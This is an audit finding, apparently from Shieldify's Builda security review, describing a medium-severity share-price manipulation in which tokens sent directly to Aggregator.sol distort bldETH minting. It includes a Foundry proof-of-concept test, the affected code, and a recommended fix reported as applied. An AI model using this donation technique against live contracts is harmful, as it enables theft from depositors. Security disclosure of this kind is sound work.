---
# Core Classification
protocol: Builda
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 43997
audit_firm: Shieldify
contest_link: none
source_link: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Builda-Security-Review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Shieldify Security
---

## Vulnerability Title

[M-01] Attacker Can Manipulate the Amount of `bldETH` that Should Be Minted to Users

### Overview


This bug report is about a function called `depositLRT()` which allows users to deposit LRT eth tokens and receive bldETH tokens. However, there is a possibility for a malicious user to manipulate the calculation in the mint function, which determines the amount of bldETH tokens to be minted. This can happen because the function relies on the `totalAssets()` function, which returns the `balanceOf()` to the `Aggregator.sol` contract. This allows a malicious user to send LRT eth directly to the contract and manipulate the minted amount for each user. The proof of concept code provided in the report shows how this can be done. The affected code is located in the `Aggregator.sol` file and the recommendation is to create a mapping to handle deposits and withdrawals instead of relying on the `totalAssets()` function. The team has responded that the issue has been fixed.

### Original Finding Content

## Severity

Medium Risk

## Description

The function `depositLRT()` allows the user to deposit LRT eth tokens to the protocol and mint bldETH tokens to the user, however, the calculation that happened in the mint function opens the possibility for a malicious user to manipulate it, this is possible because the mint function depends on the calculation below:
`amount * getTotalShares / getTotalAssets`

The `totalAssets` will return the `balanceOf()` to the `Aggregator.sol` contract this allows a malicious user to send LRT eth directly to the contract and manipulate the minted amount for each user, probably this scenario happens by someone who wants to mint more `bldETH` with less LRT depositing, the PoC below shows how transfer LRT directly can affect the mint calculation.

## Proof of Concept

```solidity
function testDepositAttackSameBlock() public virtual {
    // Note: Remove Bob transfer to show the fair amount that Alice should get (bldETH amount)
    uint256 rounding = 4;
    vm.startPrank(bob);
    uint256 amount = 1 ether;
    vm.deal(bob, amount);
    super.depositDirectOnLRT(s_eETH, amount, bob);
    s_eETH.transfer(address(s_aggregator), amount);
    vm.stopPrank();

    uint256 amount1 = 1 ether;
    vm.deal(alice, amount1);
    vm.startPrank(alice);
    super.depositDirectOnLRT(s_eETH, amount1, alice);
    super.approveAndDepositLRTOnBuilda(s_eETH, alice);
    vm.stopPrank();

    uint256 amount2 = 1 ether;
    vm.deal(alice, amount2);
    vm.startPrank(alice);
    super.depositDirectOnLRT(s_eETH, amount2, alice);
    super.approveAndDepositLRTOnBuilda(s_eETH, alice);

    uint256 aliceBLDBalance = s_aggregator.bldETH().balanceOf(alice);
    uint256 aliceActualDepositedAmount = amount1 + amount2;

    console.log("Alice BLD Balance: ", aliceBLDBalance);

    assertEq(aliceBLDBalance + rounding, aliceActualDepositedAmount);
    vm.stopPrank();
}
```

## Location of Affected Code

File: [src/Aggregator.sol#L538](https://github.com/Builda-Protocol/builda_protocol/blob/23066dc1c56a59cf84e971b678aa7b5da98be0ab/src/Aggregator.sol#L538)

```solidity
function totalAssets() public view returns (uint256, uint256, uint256) {
    return (
        etherFiEETH.asset.balanceOf(address(this)),
        renzoEzETH.asset.balanceOf(address(this)),
        kelpRsETH.asset.balanceOf(address(this))
    );
}
```

## Recommendation

Consider creating a mapping which handles any deposit and withdrawal rather than depending on the `totalAssets()` function which makes use of `balanceOf(address(this))`.

## Team Response

Fixed.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Shieldify |
| Protocol | Builda |
| Report Date | N/A |
| Finders | Shieldify Security |

### Source Links

- **Source**: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Builda-Security-Review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

